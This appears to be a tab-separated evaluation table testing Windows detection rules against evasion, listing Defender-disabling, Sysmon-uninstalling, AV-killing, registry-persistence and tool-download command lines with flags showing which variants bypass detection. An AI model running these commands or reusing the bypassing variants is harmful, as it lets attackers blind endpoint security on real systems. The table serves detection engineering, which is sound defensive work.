Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217	powershell.exe  Set-MpPreference -DisableBehaviorMonitoring $true	powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true	TRUE	FALSE	FALSE	Powershell Defender Disable Scan Feature (1ec65a5f-9473-4f12-97da-622044d6df21); Powershell Defender Disable Scan Feature (1ec65a5f-9473-4f12-97da-622044d6df21); Disable Windows Defender AV Security Monitoring (a7ee1722-c3c5-aeff-3212-c777e4733217); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableBehaviorMonitoring 1	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -PropertyType DWord -Name ""DisableFirstRunCustomize"" -Value 2"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"reg add ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}"" /v IsInstalled /t REG_DWORD /d 0 /f"	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_powershell_disable_ie_features	Disabled IE Security Features	fb50eb7a-5ab1-43ae-bcc9-091818cb8424		"Set-ItemProperty -Path ""HKLM\SOFTWARE\Microsoft\Internet Explorer\Main"" -Name ""IEHarden"" -Value 0"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe ""& { $p = @{ 'Controlled' + 'FolderAccessProtectedFolders' = 'C:\' }; Remove-MpPreference @p }"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448	"cmd.exe /c ""powershell.exe -Command \""Set-Alias -Name 'RMP' -Value 'Remove-MpPreference'; RMP -ControlledFolderAccessProtectedFolders 'C:\Secret'\"""""	"powershell.exe -Command ""Set-Alias -Name 'RMP' -Value 'Remove-MpPreference'; RMP -ControlledFolderAccessProtectedFolders 'C:\Secret'"""	TRUE	FALSE	FALSE	Tamper Windows Defender Remove-MpPreference (07e3cb2c-0608-410d-be4b-1511cb1a0448); Tamper Windows Defender Remove-MpPreference (07e3cb2c-0608-410d-be4b-1511cb1a0448); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		powershell.exe -EncodedCommand UmVtb3ZlLU1wUHJlZmVyZW5jZSAtQ29udHJvbGxlZEZvbGRlckFjY2Vzc1Byb3RlY3RlZEZvbGRlcnMgQzpcVGVtcA==	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_remove_mppreference	Tamper Windows Defender Remove-MpPreference	07e3cb2c-0608-410d-be4b-1511cb1a0448		"powershell.exe -ExecutionPolicy Bypass -Command ""$cmd = 'Remove-Mp' + 'Preference'; Invoke-Expression ($cmd + ' -ControlledFolderAccessProtectedFolders C:\Users\Public')"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_set_service_disabled	Service StartupType Change Via PowerShell Set-Service	62b20d44-1546-4e61-afce-8e175eb9473c		"powershell -Command ""Invoke-Expression ('Set-Ser' + 'vice ' + '-Servicename wuauserv -StartupT' + 'ype Dis' + 'abled')"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_set_service_disabled	Service StartupType Change Via PowerShell Set-Service	62b20d44-1546-4e61-afce-8e175eb9473c		"powershell -Command ""Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv' -Name 'Start' -Value 4"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_set_service_disabled	Service StartupType Change Via PowerShell Set-Service	62b20d44-1546-4e61-afce-8e175eb9473c		"powershell -ExecutionPolicy Bypass -Command ""sc.exe config 'TermService' start= disabled"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_set_service_disabled	Service StartupType Change Via PowerShell Set-Service	62b20d44-1546-4e61-afce-8e175eb9473c		"pwsh.exe -Command ""Set-Service -Name 'Spooler' -StartupType 'Disabled'"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_pua_cleanwipe	PUA - CleanWipe Execution	f44800ac-38ec-471f-936e-3fa7d9c53100		CATClean.exe -uninstall	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_pua_cleanwipe	PUA - CleanWipe Execution	f44800ac-38ec-471f-936e-3fa7d9c53100		copy SepRemovalToolNative_x64.exe not_an_installer.exe && not_an_installer.exe	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_pua_cleanwipe	PUA - CleanWipe Execution	f44800ac-38ec-471f-936e-3fa7d9c53100		NetInstaller.exe /r	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_pua_cleanwipe	PUA - CleanWipe Execution	f44800ac-38ec-471f-936e-3fa7d9c53100		WFPUnins.exe /enterprise /uninstal	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_reg_defender_exclusion	Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE	48917adc-a28e-4f5d-b729-11e75da8941f		"powershell.exe -Command ""New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths' -Name 'C:\Users\Public\Temp' -Value 0 -PropertyType DWord -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_reg_defender_exclusion	Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE	48917adc-a28e-4f5d-b729-11e75da8941f		"reg  ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v ""C:\Windows\Temp"" /t REG_BINARY /d 00000000"	TRUE	TRUE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1562.001	proc_creation_win_reg_defender_exclusion	Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE	48917adc-a28e-4f5d-b729-11e75da8941f	"reg.exe  ADD \""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\"" /v \""C:\Evil\"" /t REG_DWORD /d 0 /f"	"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v ""C:\Evil"" /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE (48917adc-a28e-4f5d-b729-11e75da8941f)
t1562.001	proc_creation_win_reg_disable_defender_wmi_autologger	Disabling Windows Defender WMI Autologger Session via Reg.exe	a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6		"copy reg.exe not_reg.exe && not_reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v Start /t REG_DWORD /d 0 /f"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_reg_disable_defender_wmi_autologger	Disabling Windows Defender WMI Autologger Session via Reg.exe	a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6		"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""S""t""a""r""t"" /d 0 /f"	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_reg_disable_defender_wmi_autologger	Disabling Windows Defender WMI Autologger Session via Reg.exe	a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6		"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v Start /t REG_DWORD /d 0x00000000 /f"	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	"reg   add \""HKLM\SOFTWARE\Microsoft\Windows Defender\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f"	"reg  add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	"reg   add \""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration\"" /v Notification_Suppress /t REG_DWORD /d 1 /f"	"reg  add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	reg   add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f	reg  add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	reg   add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f	reg  add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3		"copy reg.exe not_reg.exe && not_reg.exe add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiVirus /t REG_DWORD /d 1 /f"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3		"reg  add  ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d 0x1 /f"	TRUE	TRUE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829)
t1562.001	proc_creation_win_registry_office_disable_python_security_warnings	Python Function Execution Security Warning Disabled In Excel	023c654f-8f16-44d9-bb2b-00ff36a62af9		"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /f /v PythonFunctionWarnings /d ""0"""	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_registry_office_disable_python_security_warnings	Python Function Execution Security Warning Disabled In Excel	023c654f-8f16-44d9-bb2b-00ff36a62af9	"cmd.exe /c ""reg.exe add \""HKCU\Software\Microsoft\Office\16.0\Excel\Security\"" /v \""PythonFunctionWarnings\"" /t REG_DWORD /d 00000000 /f"""	"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /v ""PythonFunctionWarnings"" /t REG_DWORD /d 00000000 /f"	TRUE	FALSE	FALSE	Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9); Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9)
t1562.001	proc_creation_win_registry_office_disable_python_security_warnings	Python Function Execution Security Warning Disabled In Excel	023c654f-8f16-44d9-bb2b-00ff36a62af9	"cmd.exe /c ""reg.exe add \""HKCU\Software\Microsoft\Office\16.0\Excel\Security\"" /v \""PythonFunctionWarnings\"" /t REG_DWORD /d 0x0 /f"""	"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /v ""PythonFunctionWarnings"" /t REG_DWORD /d 0x0 /f"	TRUE	FALSE	FALSE	Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9); Python Function Execution Security Warning Disabled In Excel (023c654f-8f16-44d9-bb2b-00ff36a62af9)
t1562.001	proc_creation_win_susp_disable_raccine	Raccine Uninstall	a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc		"powershell.exe -Command ""Stop-Process -Name RaccineSettings -Force"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_susp_disable_raccine	Raccine Uninstall	a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc		"reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Raccine"" /f"	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_susp_disable_raccine	Raccine Uninstall	a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc		"schtasks /DELETE /TN ""Raccine Rules*"" /F"	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_susp_disable_raccine	Raccine Uninstall	a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc		taskkill /IM Raccine* /F	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_sysinternals_pssuspend_susp_execution	Sysinternals PsSuspend Suspicious Execution	4beb6ae0-f85b-41e2-8f18-8668abc8af78		ren pssuspend64.exe not_suspicious.exe && .\not_suspicious.exe -r msmpeng.exe	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_sysinternals_sysmon_config_update	Sysmon Configuration Update	87911521-7098-470b-a459-9a57fc80bdfd		copy Sysmon64.exe not_sysmon.exe && not_sysmon.exe /c C:\Windows\Temp\minimal.xml	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_sysinternals_sysmon_uninstall	Uninstall Sysinternals Sysmon	6a5f68d1-c4b5-46b9-94ee-5324892ea939		copy Sysmon64.exe not_sysmon.exe && not_sysmon.exe -u	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_sysinternals_sysmon_uninstall	Uninstall Sysinternals Sysmon	6a5f68d1-c4b5-46b9-94ee-5324892ea939		Sysmon64.exe /u	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_taskkill_sep	Taskkill Symantec Endpoint Protection	4a6713f6-3331-11ed-a261-0242ac120002		"taskkill /f /im ""ccSvcHst.exe """	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_taskkill_sep	Taskkill Symantec Endpoint Protection	4a6713f6-3331-11ed-a261-0242ac120002		taskkill /F /IM ccsVCHST.EXE	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8		copy deviceenroller.exe not_an_enroller.exe && not_an_enroller.exe /PhoneDeepLink	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8		deviceenroller.exe -PhoneDeepLink	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_deviceenroller_dll_sideloading	Potential DLL Sideloading Via DeviceEnroller.EXE	e173ad47-4388-4012-ae62-bd13f71c18a8		"deviceenroller.exe /Phone""""DeepLink"	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		copy dnscmd.exe not_dns.exe && not_dns.exe /config /serverlevelplugindll malicious.dll	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL malicious.dll	FALSE	FALSE	FALSE	
t1574.001	proc_creation_win_dnscmd_install_new_server_level_plugin_dll	New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE	f63b56ee-3f79-4b8a-97fb-5c48007e8573		"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters"" /v ServerLevelPluginDll /t REG_SZ /d ""malicious.dll"" /f"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"reg  query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"reg  query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"reg  query ""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"" /v TimeZoneKeyName"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path  \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path  \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""}"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path  \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path  \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""}"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		powershell.exe /Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'	FALSE	FALSE	FALSE	
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"powershell.exe /Invoke-Command -ScriptBlock { Start-Process 'cmd.exe' -ArgumentList '/c ""echo Success""' }"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		dtrace.exe	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe  -w ""syscall:::return {lkd(0); exit(0);}"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe  -w -n ""syscall:::return {lkd(0); exit(0);}"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		rundll32.exe legit.dll,#1	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		winPEAS.exe	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		"copy cmd.exe not_a_peas.exe && not_a_peas.exe /c ""powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/carlospolop/PEASS-ng/releases/download/20240515-39d7363c/winPEASany.exe', 'wp.exe'); start-process 'wp.exe' -ArgumentList 'systeminfo', 'userinfo', 'networkinfo'"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		"reg add ""HKCU\Software\Classes\ms-settings\shell\open\command"" /ve /t REG_SZ /d ""wp.exe"" /f && dotnet wp.exe"	FALSE	FALSE	FALSE	
t1082	proc_creation_win_hktl_winpeas	HackTool - winPEAS Execution	98b53e78-ebaf-46f8-be06-421aafd176d9		wpeas.exe	FALSE	FALSE	FALSE	
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f		REG  QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid	FALSE	FALSE	FALSE	
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f		"cmd /c reg query ""HKLM\SOFTWARE\Microsoft\Cryptography"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f		"powershell -NoProfile -Command ""[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Cryptography').GetValue('MachineGuid')"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_reg_machineguid	Suspicious Query of MachineGUID	f5240972-3938-4e56-8e4b-e33893176c1f		"powershell -NoProfile -Command ""Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' | Select-Object -ExpandProperty MachineGuid"""	FALSE	FALSE	FALSE	
t1055	proc_creation_win_dllhost_no_cli_execution	Dllhost.EXE Execution Anomaly	e7888eb1-13b0-4616-bd99-4bc0c2b054b9		dllhost.exe	FALSE	FALSE	FALSE	
t1055	proc_creation_win_hktl_coercedpotato	HackTool - CoercedPotato Execution	e8d34729-86a4-4140-adfd-0a29c2106307		update_service.exe -e 1	FALSE	FALSE	FALSE	
t1055	proc_creation_win_hktl_dinjector	HackTool - DInjector PowerShell Cradle Execution	d78b5d61-187d-44b6-bf02-93486a80de5a		DInjector.exe /am^51 /pass^word:secret	FALSE	FALSE	FALSE	
t1055	proc_creation_win_hktl_dinjector	HackTool - DInjector PowerShell Cradle Execution	d78b5d61-187d-44b6-bf02-93486a80de5a		DInjector.exe/am51 /password:secret	FALSE	FALSE	FALSE	
t1055	proc_creation_win_rundll32_inline_vbs	Suspicious Rundll32 Invoking Inline VBScript	1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd		"copy rundll32.exe updater.exe && updater.exe vbscript:""Execute(RegRead('...')); window.close;"""	FALSE	FALSE	FALSE	
